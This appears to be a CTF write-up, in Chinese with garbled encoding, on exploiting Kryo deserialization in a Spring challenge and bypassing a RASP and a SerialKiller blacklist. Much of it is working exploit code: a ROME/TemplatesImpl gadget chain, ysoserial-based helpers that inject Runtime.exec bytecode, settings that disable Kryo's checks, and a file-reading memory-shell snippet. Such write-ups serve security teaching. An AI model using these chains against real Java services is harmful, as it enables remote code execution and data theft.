this.kryo.getClass().getDeclaredMethods(); int var4 = var3.length; for(int var5 = 0; var5 &lt; var4; ++var5) &#123; Method setMethod = var3[var5]; if (setMethod.getName().startsWith(&quot;set&quot;)) &#123; try &#123; Object p1 = serializeConfig.get(setMethod.getName().substring(3)); if (!setMethod.getParameterTypes()[0].isPrimitive()) &#123; try &#123; p1 = Class.forName((String)p1).newInstance(); setMethod.invoke(this.kryo, p1); &#125; catch (Exception var9) &#123; var9.printStackTrace(); &#125; &#125; else &#123; setMethod.invoke(this.kryo, p1); &#125; &#125; catch (Exception var10) &#123; &#125; &#125; &#125; &#125; ByteArrayOutputStream bos = new ByteArrayOutputStream(); Output output = new Output(bos); this.kryo.register(Mocha.class); this.kryo.writeClassAndObject(output, new Mocha()); output.flush(); output.close(); return new Message(200, &quot;Mocha!&quot;, Base64.getEncoder().encode(bos.toByteArray())); &#125; é¦–å…ˆè¦è§£å†³è¿™é“é¢˜ï¼Œæˆ‘ä»¬å¾—çŸ¥é“å‰äººéƒ½æœ‰ä¸€äº›ä»€ä¹ˆç ”ç©¶ é€šè¿‡è°·æ­Œç®€å•æœç´¢å¯ä»¥æœåˆ°ä¸€ç¯‡æ–‡ç« ï¼šæµ…æDubbo Kryo/FSTååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2021-25641ï¼‰ å…¶ä¸­æ¯”è¾ƒæœ‰ä¿¡æ¯é‡çš„æ˜¯è°ƒç”¨æ ˆï¼Œä½†æ˜¯è¿™é‡Œé¢˜ç›®ç¯å¢ƒé‡Œé¢æ²¡æœ‰ä¾èµ– ä½†æ˜¯è¿™é‡Œæœ‰romeä¾èµ–ï¼Œé‚£ä¹ˆå¾ˆå®¹æ˜“æƒ³åˆ°EqualsBeanå»è§¦å‘ROMEçš„åˆ©ç”¨é“¾å­ å…·ä½“åˆ©ç”¨è¿‡ç¨‹(Payloadæ„é€ è¿‡ç¨‹)æ ¹æ®dubboçš„åˆ©ç”¨é“¾è¿›è¡Œä¿®æ”¹æˆ‘ä»¬å¯ä»¥å¾—åˆ°è¿™æ ·çš„ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124package demo;import com.esotericsoftware.kryo.Kryo;import com.esotericsoftware.kryo.io.Input;import com.esotericsoftware.kryo.io.Output;import com.esotericsoftware.kryo.util.DefaultInstantiatorStrategy;import com.rometools.rome.feed.impl.EqualsBean;import com.rometools.rome.feed.impl.ToStringBean;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.rowset.JdbcRowSetImpl;import fun.mrctf.springcoffee.model.ExtraFlavor;import fun.mrctf.springcoffee.model.Mocha;import javassist.ClassPool;import org.json.JSONObject;import org.objenesis.strategy.SerializingInstantiatorStrategy;import org.objenesis.strategy.StdInstantiatorStrategy;import org.springframework.aop.target.HotSwappableTargetSource;import javax.sql.rowset.BaseRowSet;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.net.InetAddress;import java.net.URL;import java.net.URLConnection;import java.net.URLStreamHandler;import java.util.Base64;import java.util.HashMap;public class Testt &#123; protected Kryo kryo = new Kryo(); public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123; Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); &#125; public String ser(String raw) throws Exception&#123; JSONObject serializeConfig = new JSONObject(raw); if (serializeConfig.has(&quot;polish&quot;) &amp;&amp; serializeConfig.getBoolean(&quot;polish&quot;)) &#123; this.kryo = new Kryo(); Method[] var3 = this.kryo.getClass().getDeclaredMethods(); int var4 = var3.length; for(int var5 = 0; var5 &lt; var4; ++var5) &#123; Method setMethod = var3[var5]; if (setMethod.getName().startsWith(&quot;set&quot;)) &#123; try &#123; Object p1 = serializeConfig.get(setMethod.getName().substring(3)); if (!setMethod.getParameterTypes()[0].isPrimitive()) &#123; try &#123; p1 = Class.forName((String)p1).newInstance(); setMethod.invoke(this.kryo, p1); &#125; catch (Exception var9) &#123; var9.printStackTrace(); &#125; &#125; else &#123; setMethod.invoke(this.kryo, p1); &#125; &#125; catch (Exception var10) &#123; &#125; &#125; &#125; &#125; ByteArrayOutputStream bos = new ByteArrayOutputStream(); Output output = new Output(bos); HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;(); TemplatesImpl templates = new TemplatesImpl(); byte[][] bytes = new byte[][]&#123;ClassPool.getDefault().get(&quot;demo.YYDS&quot;).toBytecode()&#125;; EqualsBean bean = new EqualsBean(String.class,&quot;&quot;); setFieldValue(templates, &quot;_bytecodes&quot;, bytes); setFieldValue(templates, &quot;_name&quot;, &quot;1&quot;); setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); setFieldValue(bean,&quot;beanClass&quot;, Templates.class); setFieldValue(bean,&quot;obj&quot;,templates); Object gadgetChain = Utils.makeXStringToStringTrigger(templates,bean); // toString() trigger objectObjectHashMap.put(gadgetChain,&quot;&quot;); kryo.writeClassAndObject(output, objectObjectHashMap); output.flush(); output.close(); return new String(Base64.getEncoder().encode(bos.toByteArray())); &#125; public void deser(String raw)&#123; ByteArrayInputStream bas = new ByteArrayInputStream(Base64.getDecoder().decode(raw)); Input input = new Input(bas); ExtraFlavor flavor = (ExtraFlavor)this.kryo.readClassAndObject(input); System.out.println(flavor.getName()); &#125; public static void main(String[] args) throws Exception &#123; Testt test = new Testt(); String ser = test.ser(&quot;&#123;\\&quot;polish\\&quot;:true,\\&quot;RegistrationRequired\\&quot;:false,\\&quot;InstantiatorStrategy\\&quot;: \\&quot;org.objenesis.strategy.StdInstantiatorStrategy\\&quot;&#125;&quot;); test.deser(ser); &#125;&#125; ä»¥åŠUtilsç±» 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216package demo;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.springframework.aop.target.HotSwappableTargetSource;import sun.reflect.ReflectionFactory;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.Serializable;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;/* * Utility class - based on code found in ysoserial, includes method calls used in * ysoserial.payloads.util specifically the Reflections, Gadgets, and ClassFiles classes. These were * consolidated into a single util class for the sake of brevity; they are otherwise unchanged. * * Additionally, uses code based on marshalsec.gadgets.ToStringUtil.makeSpringAOPToStringTrigger * to create a toString trigger * * ysoserial by Chris Frohoff - https://github.com/frohoff/ysoserial * marshalsec by Moritz Bechler - https://github.com/mbechler/marshalsec */public class Utils &#123; static &#123; // special case for using TemplatesImpl gadgets with a SecurityManager enabled System.setProperty(DESERIALIZE_TRANSLET, &quot;true&quot;); // for RMI remote loading System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;); &#125; public static final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;; public static class StubTransletPayload extends AbstractTranslet implements Serializable &#123; private static final long serialVersionUID = -5971610431559700674L; public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException &#123;&#125; @Override public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException &#123;&#125; &#125; // required to make TemplatesImpl happy public static class Foo implements Serializable &#123; private static final long serialVersionUID = 8207363842866235160L; &#125; public static InvocationHandler createMemoizedInvocationHandler (final Map&lt;String, Object&gt; map ) throws Exception &#123; return (InvocationHandler) Utils.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map); &#125; public static Object createTemplatesImpl ( final String command ) throws Exception &#123; if ( Boolean.parseBoolean(System.getProperty(&quot;properXalan&quot;, &quot;false&quot;)) ) &#123; return createTemplatesImpl( command, Class.forName(&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;), Class.forName(&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;), Class.forName(&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;)); &#125; return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class); &#125; public static &lt;T&gt; T createTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory ) throws Exception &#123; final T templates = tplClass.newInstance(); // use template gadget class ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(Utils.StubTransletPayload.class)); pool.insertClassPath(new ClassClassPath(abstTranslet)); final CtClass clazz = pool.get(Utils.StubTransletPayload.class.getName()); // run command in static initializer // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections String cmd = &quot;System.out.println(\\&quot;whoops!\\&quot;); java.lang.Runtime.getRuntime().exec(\\&quot;&quot; + command.replaceAll(&quot;\\\\\\\\&quot;,&quot;\\\\\\\\\\\\\\\\&quot;).replaceAll(&quot;\\&quot;&quot;, &quot;\\\\\\&quot;&quot;) + &quot;\\&quot;);&quot;; clazz.makeClassInitializer().insertAfter(cmd); // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion) clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime()); CtClass superC = pool.get(abstTranslet.getName()); clazz.setSuperclass(superC); final byte[] classBytes = clazz.toBytecode(); // inject class bytes into instance Utils.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123; classBytes, Utils.classAsBytes(Utils.Foo.class) &#125;); // required to make TemplatesImpl happy Utils.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;); Utils.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance()); return templates; &#125; public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123; Field field = null; try &#123; field = clazz.getDeclaredField(fieldName); field.setAccessible(true); &#125; catch (NoSuchFieldException ex) &#123; if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); &#125; return field; &#125; public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); &#125; public static Object getFieldValue(final Object obj, final String fieldName) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); return field.get(obj); &#125; public static Constructor&lt;?&gt; getFirstCtor(final String name) throws Exception &#123; final Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[0]; ctor.setAccessible(true); return ctor; &#125; @SuppressWarnings ( &#123;&quot;unchecked&quot;&#125; ) public static &lt;T&gt; T createWithConstructor ( Class&lt;T&gt; classToInstantiate, Class&lt;? super T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123; Constructor&lt;? super T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes); objCons.setAccessible(true); Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons); sc.setAccessible(true); return (T)sc.newInstance(consArgs); &#125; public static String classAsFile(final Class&lt;?&gt; clazz) &#123; return classAsFile(clazz, true); &#125; public static String classAsFile(final Class&lt;?&gt; clazz, boolean suffix) &#123; String str; if (clazz.getEnclosingClass() == null) &#123; str = clazz.getName().replace(&quot;.&quot;, &quot;/&quot;); &#125; else &#123; str = classAsFile(clazz.getEnclosingClass(), false) + &quot;$&quot; + clazz.getSimpleName(); &#125; if (suffix) &#123; str += &quot;.class&quot;; &#125; return str; &#125; public static byte[] classAsBytes(final Class&lt;?&gt; clazz) &#123; try &#123; final byte[] buffer = new byte[1024]; final String file = classAsFile(clazz); final InputStream in = Utils.class.getClassLoader().getResourceAsStream(file); if (in == null) &#123; throw new IOException(&quot;couldn&#x27;t find &#x27;&quot; + file + &quot;&#x27;&quot;); &#125; final ByteArrayOutputStream out = new ByteArrayOutputStream(); int len; while ((len = in.read(buffer)) != -1) &#123; out.write(buffer, 0, len); &#125; return out.toByteArray(); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; &#125; public static HashMap&lt;Object, Object&gt; makeMap (Object v1, Object v2 ) throws Exception &#123; HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;(); Utils.setFieldValue(s, &quot;size&quot;, 2); Class&lt;?&gt; nodeC; try &#123; nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;); &#125; catch ( ClassNotFoundException e ) &#123; nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;); &#125; Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC); nodeCons.setAccessible(true); Object tbl = Array.newInstance(nodeC, 2); Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null)); Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null)); Utils.setFieldValue(s, &quot;table&quot;, tbl); return s; &#125; public static Object makeXStringToStringTrigger(Object o,Object bean) throws Exception &#123; return Utils.makeMap(new HotSwappableTargetSource(o), new HotSwappableTargetSource(bean)); &#125;&#125; ä½†æ˜¯å½“ä½ å…´å†²å†²çš„å†™å¥½åˆ©ç”¨é“¾ä»¥åï¼Œä¼šå‘ç°å‡ ä¸ªé—®é¢˜ é¦–å…ˆä½ ä¼šçœ‹åˆ°ä¸€è¡ŒæŠ¥é”™,Class is not registered: java.util.HashMap é‚£ä¹ˆä½ è‚¯å®šä¼šç–‘æƒ‘è¿™æ˜¯ä»€ä¹ˆç©æ„å„¿ï¼Ÿå®ƒæ¥è‡ªå“ªé‡Œï¼Ÿ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨com.esotericsoftware.kryo.Kryo#Kryo(com.esotericsoftware.kryo.ClassResolver, com.esotericsoftware.kryo.ReferenceResolver) é¦–å…ˆå®ä¾‹åŒ–çš„æ—¶å€™æ³¨å†Œäº†ä¸€äº›åŸºæœ¬ç±»å‹ ç„¶ååœ¨ä»£ç å½“ä¸­æœ‰this.kryo.register(Mocha.class); å¯ä»¥çœ‹åˆ°é»˜è®¤æ˜¯FieldSerializer é‚£æˆ‘ä»¬ä¹ŸçŸ¥é“æˆ‘ä»¬è¿™ä¸ªæ€è·¯è§¦å‘çš„æ ¸å¿ƒæ˜¯é€šè¿‡com.esotericsoftware.kryo.serializers.MapSerializerï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬æ²¡æ³•è‡ªå·±æ³¨å†Œæ€ä¹ˆåŠå‘¢ï¼Œè¿˜è®°å¾—ä¸Šé¢é‚£ä¸ªè·¯ç”±ä¹ˆï¼Œdemoè·¯ç”±å½“ä¸­å¯ä»¥æ ¹æ®æˆ‘ä»¬å‰ç«¯ä¼ å…¥çš„jsonå½“ä¸­çš„ç†Ÿæ‚‰æ§åˆ¶æ‰§è¡Œå¯¹åº”çš„setæ–¹æ³•åšå±æ€§æ›´æ”¹ï¼Œè¿™é‡Œæˆ‘ä¸ç›´æ¥è¯´éœ€è¦æ›´æ”¹å“ªäº›å±æ€§å»è§£å†³è¿™é“é¢˜ï¼Œä¸ªäººæ›´å€¾å‘äºé‡åˆ°ä¸€ä¸ªé—®é¢˜è§£å†³ä¸€ä¸ªé—®é¢˜ é‚£ä¹ˆæ—¢ç„¶èƒ½æ§åˆ¶å±æ€§ï¼Œæˆ‘ä»¬ä¹Ÿå¾—çŸ¥é“èƒ½æ§åˆ¶é‚£ä¸€äº›ï¼Œé€šè¿‡ç®€å•è¾“å‡ºå¯ä»¥å¾—åˆ° 123456789101112setWarnUnregisteredClassessetDefaultSerializersetDefaultSerializersetClassLoadersetRegistrationRequiredsetReferencessetCopyReferencessetReferenceResolversetInstantiatorStrategysetAutoResetsetMaxDepthsetOptimizedGenerics å›åˆ°åˆšåˆšçš„é—®é¢˜ æ—¢ç„¶å¦‚æ­¤é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆéœ€è¦çŸ¥é“åœ¨å“ªé‡ŒæŠ›å‡ºäº†è¿™ä¸ªå¼‚å¸¸ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ com.esotericsoftware.kryo.Kryo#getRegistration(java.lang.Class) ç®€å•åˆ—å‡ºç°åœ¨çš„è°ƒç”¨æ ˆï¼Œæ˜¯åœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹å½“ä¸­ 123456getRegistration:579, Kryo (com.esotericsoftware.kryo)writeClass:112, DefaultClassResolver (com.esotericsoftware.kryo.util)writeClass:613, Kryo (com.esotericsoftware.kryo)writeClassAndObject:708, Kryo (com.esotericsoftware.kryo)ser:97, Testt (demo)main:121, Testt (demo) å¯ä»¥çœ‹åˆ°æ ¹æ®ç±»å‹åœ¨this.classResolver.getRegistrationæ— ç»“æœå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œé€šè¿‡debugè¾“å‡ºclassResolverå½“ä¸­çš„å…³é”®ä¿¡æ¯ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾å¾—åˆ°åŸºæœ¬éƒ½æ˜¯ä¸€äº›åŸºæœ¬çš„æ•°æ®ç±»å‹,æ²¡æœ‰æˆ‘ä»¬çš„Map 12345678910111213141516171819&#123;char=[5, char], long=[7, long], class java.lang.Byte=[4, byte], class java.lang.Character=[5, char], double=[8, double], class java.lang.Short=[6, short], int=[0, int], class java.lang.Integer=[0, int], byte=[4, byte], float=[2, float], class java.lang.Double=[8, double], class java.lang.Boolean=[3, boolean], boolean=[3, boolean], short=[6, short], class java.lang.Long=[7, long], class java.lang.String=[1, String], class java.lang.Float=[2, float]&#125; æˆ‘ä»¬å†æ¥çœ‹åœ¨æŠ›å‡ºå¼‚å¸¸çš„é‚£éƒ¨åˆ†ï¼Œå¦‚æœå°†registrationRequiredè®¾ç½®ä¸ºfalseï¼Œåˆ™å¯ä»¥ç•¥è¿‡è¿™äº›è¿‡ç¨‹ æ­¤æ—¶å®ƒä¼šæ‰§è¡Œcom.esotericsoftware.kryo.util.DefaultClassResolver#registerImplicit =&gt;com.esotericsoftware.kryo.Kryo#getDefaultSerializeræœ€ç»ˆè·å–åˆ°æˆ‘ä»¬éœ€è¦çš„com.esotericsoftware.kryo.serializers.MapSerializer é€šè¿‡æ¯”å¯¹å±æ€§ä»¥åŠä¸Šé¢æåˆ°çš„å¯åˆ©ç”¨çš„setæ–¹æ³•ï¼Œæˆ‘ä»¬èƒ½å¾ˆå®¹æ˜“é€šè¿‡payloadçš„ä¼ å…¥æ§åˆ¶è¿™ä¸ªè¿‡ç¨‹ 1&#123;&quot;RegistrationRequired&quot;:false&#125; okå½“ä½ æ„Ÿè§‰åˆè¡Œçš„æ—¶å€™ï¼Œåˆå…´è‡´å†²å†²è¿è¡Œäº†ä»£ç ï¼Œæ­¤æ—¶åˆå‡ºç°Class cannot be created (missing no-arg constructor):ï¼Œå­—é¢æ„æ€æ˜¯æˆ‘ä»¬åºåˆ—åŒ–çš„ç±»éœ€è¦æœ‰æ— å‚æ„é€ å‡½æ•° é‚£æˆ‘ä»¬å†è·Ÿè¿›ä»£ç çœ‹çœ‹å®ä¾‹åŒ–æŠ¥é”™åˆ°åº•æ˜¯æ€ä¹ˆå›äº‹ï¼Œåœ¨å®ä¾‹åŒ–ä¸€ä¸ªç±»çš„æ—¶å€™ä¼šé€šè¿‡è°ƒç”¨com.esotericsoftware.kryo.Kryo#newInstantiatorï¼Œ å¹¶æœ€ç»ˆä¼šè°ƒç”¨åˆ°com.esotericsoftware.kryo.util.DefaultInstantiatorStrategy#newInstantiatorOf æ­¤æ—¶çš„è°ƒç”¨æ ˆä¸º 1234567891011121314newInstantiatorOf:96, DefaultInstantiatorStrategy (com.esotericsoftware.kryo.util)newInstantiator:1190, Kryo (com.esotericsoftware.kryo)newInstance:1199, Kryo (com.esotericsoftware.kryo)create:163, FieldSerializer (com.esotericsoftware.kryo.serializers)read:122, FieldSerializer (com.esotericsoftware.kryo.serializers)readClassAndObject:880, Kryo (com.esotericsoftware.kryo)read:226, MapSerializer (com.esotericsoftware.kryo.serializers)read:42, MapSerializer (com.esotericsoftware.kryo.serializers)readClassAndObject:880, Kryo (com.esotericsoftware.kryo)read:226, MapSerializer (com.esotericsoftware.kryo.serializers)read:42, MapSerializer (com.esotericsoftware.kryo.serializers)readClassAndObject:880, Kryo (com.esotericsoftware.kryo)deser:110, Testt (demo)main:126, Testt (demo) å¯ä»¥çœ‹åˆ°æŠ›é”™çš„åŸå› å°±æ˜¯ä¸‹é¢çš„è¿™ä¸²ä»£ç ï¼Œå®ƒé»˜è®¤æˆ‘ä»¬çš„ç±»æœ‰æ— å‚æ„é€ å‡½æ•° é‚£ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜æˆ‘ä»¬ä¹Ÿå¾—çŸ¥é“æ˜¯å¦å¯ä»¥ä¸ä½¿ç”¨DefaultInstantiatorStrategyï¼Œè½¬è€Œä½¿ç”¨å…¶ä»–InstantiatorStrategyçš„å­ç±»å‘¢ï¼Œç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡½æ•°å®ä¾‹åŒ–çš„è¿‡ç¨‹æ˜¯é€šè¿‡this.strategy.newInstantiatorOf(type)ï¼Œè€Œè¿™ä¸ªDefaultInstantiatorStrategyæ¥æºäºstrategyå±æ€§ æ­£å¥½åœ¨Kryoç±»å½“ä¸­æœ‰setæ–¹æ³•å¯ä»¥å®ç°ï¼Œcom.esotericsoftware.kryo.Kryo#setInstantiatorStrategyï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœæ˜¯StdInstantiatorStrategyç±»åˆ™æ­£å¥½ç¬¦åˆï¼ˆå®˜æ–¹æ–‡æ¡£æ¯”ä»£ç å¥½çœ‹ï¼‰ å› æ­¤æˆ‘ä»¬å¾—åˆ°æœ€ç»ˆä¼ å‚ 1&#123;&quot;polish&quot;:true,&quot;RegistrationRequired&quot;:false,&quot;InstantiatorStrategy&quot;: &quot;org.objenesis.strategy.StdInstantiatorStrategy&quot;&#125; å¯ä»¥çœ‹åˆ°åˆæŠ¥é”™äº†ï¼Œ_tfactoryç©ºæŒ‡é’ˆå¼‚å¸¸ è¿™é‡Œå¦‚ä½•è§£å†³å‘¢ï¼Ÿå…¶å®å¾ˆç®€å•ï¼Œåˆ«å¿˜äº†æˆ‘ä»¬è¿™ä¸ªå¯æ˜¯æ‰“ROMEï¼Œé€šè¿‡è§¦å‘com.rometools.rome.feed.impl.EqualsBean#beanEqualsæˆ‘ä»¬èƒ½è°ƒç”¨ä»»æ„getæ–¹æ³•ï¼Œè¿™æ—¶å€™ä¸éš¾æƒ³åˆ°äºŒæ¬¡ååºåˆ—åŒ–ï¼Œjava.security.SignedObject#getObjectï¼Œå…¶å®å°±æ˜¯è™ç¬¦çš„æ€è·¯äº†æ²¡å•¥éš¾åº¦ 123456789101112public Object getObject() throws IOException, ClassNotFoundException&#123; // creating a stream pipe-line, from b to a ByteArrayInputStream b = new ByteArrayInputStream(this.content); ObjectInput a = new ObjectInputStream(b); Object obj = a.readObject(); b.close(); a.close(); return obj;&#125; å› æ­¤ä¸éš¾å¾—åˆ°payload 1payloadhere ç»•Raspè¿™æ—¶å€™ä½ æ³¨å…¥å†…å­˜é©¬æ‰§è¡Œä¼šå‘ç°ä»€ä¹ˆéƒ½æ˜¯ç©ºçš„ è¿™æ—¶å€™ä½ ä¸€å®šå¾ˆç–‘é—®ä¸ºä»€ä¹ˆæœ¬åœ°æ‰“é€šäº†è¿œç¨‹ä¸è¡Œï¼Œæˆ‘ä¹Ÿå¾ˆç–‘æƒ‘ï¼Œä¹‹åçœ‹åˆ°å‡ºé¢˜äººè¯´ æ—¢ç„¶å­˜åœ¨wafï¼Œé‚£ä¹ˆæˆ‘ä»¬ç¬¬ä¸€ä»¶äº‹æƒ…æ˜¯ä»€ä¹ˆå‘¢ï¼Œå½“ç„¶æ˜¯éªŒè¯æ˜¯å¦æ˜¯å¯¹payloadçš„è¿‡æ»¤ å› æ­¤æˆ‘å°†æ‰§è¡Œçš„å­—èŠ‚ç æ”¹æˆ 1Thread.sleep(10000); æˆåŠŸçœ‹åˆ°é¡µé¢å»¶æ—¶ è¿™æ—¶å€™çŒœåˆ°å¯èƒ½æœ‰Rasp(æ¯•ç«Ÿå¯¹äºJavaè¿‡æ»¤base64è§£ç åçš„å­—ç¬¦ä¸²æœ‰ç‚¹å‚») é‚£ç¬¬ä¸€æ­¥å°±è¦çŸ¥é“raspçš„æ–‡ä»¶å†…å®¹ï¼Œç”¨ä¸ªä¹‹å‰ä»pç‰›é‚£é‡Œå­¦çš„ä¼ªåè®®å°trickæ–¹ä¾¿æˆ‘è¯»æ–‡ä»¶ä»¥åŠåˆ—ç›®å½• 12345678910String urlContent = &quot;&quot;;final URL url = new URL(request.getParameter(&quot;read&quot;));final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));String inputLine = &quot;&quot;;while ((inputLine = in.readLine()) != null) &#123; urlContent = urlContent + inputLine + &quot;\\n&quot;;&#125;in.close();writer.println(urlContent); ä¹‹åæˆåŠŸå¾—åˆ°raspçš„åœ°å€ï¼Œ/app/jrasp.jarï¼Œé‚£ä¹ˆä¸‹è½½ä¸‹æ¥åˆ†æå³å¯ï¼Œå›¾æ²¡æˆªå®Œï¼Œæ„æ€æ˜¯åªè¦æ‰§è¡Œåˆ°java.lang.ProcessImplçš„startæ–¹æ³•,è€Œè¿™ä¹Ÿå°±å°æ‰äº†ä¹‹å‰å¸¸è§çš„Runtime,ProcessBuilderï¼Œç”šè‡³jsæ‰§è¡Œä¹‹ç±»çš„ï¼Œelæ‰§è¡Œéƒ½ä¸è¡Œï¼Œé“ç†å¾ˆç®€å•ä¼šè°ƒç”¨åˆ°java.lang.ProcessImpl å¦‚ä½•ç»•è¿‡ä¹Ÿå¾ˆç®€å•å»æ‰¾æ›´ä¸‹ä¸€å±‚çš„è°ƒç”¨å³å¯ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡UNIXProcesså³å¯ åé¢å¾ˆæ¶å¿ƒä¸€ä¸ªè®¡ç®—é¢˜ è„šæœ¬æœ‰ä¸ªåœ°æ–¹å°é”™è¯¯å¯¼è‡´ä¸‰å°æ—¶æ²¡æ‰¾åˆ°å‰é¢ä¸èƒ½åŠ CHLD_INå¯¼è‡´æå‰è¾“å…¥é”™è¯¯ç­”æ¡ˆä¼¼ä¹ 12345678910111213141516use strict;use IPC::Open3;my $pid = open3( \\*CHLD_IN, \\*CHLD_OUT, \\*CHLD_ERR, &#x27;/readflag&#x27; ) or die &quot;open3() failed!&quot;;my $r;$r = &lt;CHLD_OUT&gt;;print &quot;$r&quot;;$r = &lt;CHLD_OUT&gt;;print &quot;$r&quot;;$r = substr($r,0,-3);$r = eval &quot;$r&quot;;print &quot;$r\\n&quot;;print CHLD_IN &quot;$r\\n&quot;;$r = &lt;CHLD_OUT&gt;;print &quot;$r&quot;; EzJava â€“ Bypass Serialkillerè§£è¯»ç¯å¢ƒé¦–å…ˆé™„ä»¶ç»™äº†ä¸¤ä¸ªä¸œè¥¿ä¸€ä¸ªjarï¼Œä¸€ä¸ªserialkillerçš„é…ç½®æ–‡ä»¶ï¼Œä¸‹é¢æ˜¯jarå½“ä¸­çš„ç›®å½•æ¶æ„ è¿™æœ‰ä¸¤ä¸ªæ§åˆ¶å™¨ä½†æ˜¯ç¬¬ä¸€ä¸ªæ²¡å•¥æ„ä¹‰ï¼Œè¿™ä¸ªè·¯ç”±å¾ˆæ˜æ˜¾éœ€è¦ååºåˆ—åŒ– 123456789101112131415161718@RestControllerpublic class HelloController &#123; public HelloController() &#123; &#125; @GetMapping(&#123;&quot;/hello&quot;&#125;) public String index() &#123; return &quot;hello&quot;; &#125; @PostMapping(&#123;&quot;/hello&quot;&#125;) public String index(@RequestBody String baseStr) throws Exception &#123; byte[] decode = Base64.getDecoder().decode(baseStr); ObjectInputStream ois = new SerialKiller(new ByteArrayInputStream(decode), &quot;serialkiller.xml&quot;); ois.readObject(); return &quot;hello&quot;; &#125;&#125; ç®€å•çœ‹ä¸‹SerialKillerç±»ï¼Œå®ç°æ˜¯è½½å…¥é…ç½®è·å¾—é»‘ç™½åå•ï¼Œé€šè¿‡resolveClassåšäº†è¿‡æ»¤ï¼Œæ¥ä¸‹æ¥å°±æ¥çœ‹çœ‹é»‘åå•ï¼Œå°†æˆ‘ä»¬ååºåˆ—åŒ–çš„å…³é”®ç‚¹ç»™æ‹¿æäº† 1234567891011121314&lt;blacklist&gt; &lt;!-- ysoserial&#x27;s CommonsCollections1,3,5,6 payload --&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.Transformer$&lt;/regexp&gt; &lt;regexp&gt;org\\.apache\\.commons\\.collections\\.functors\\.InvokerTransformer$&lt;/regexp&gt; 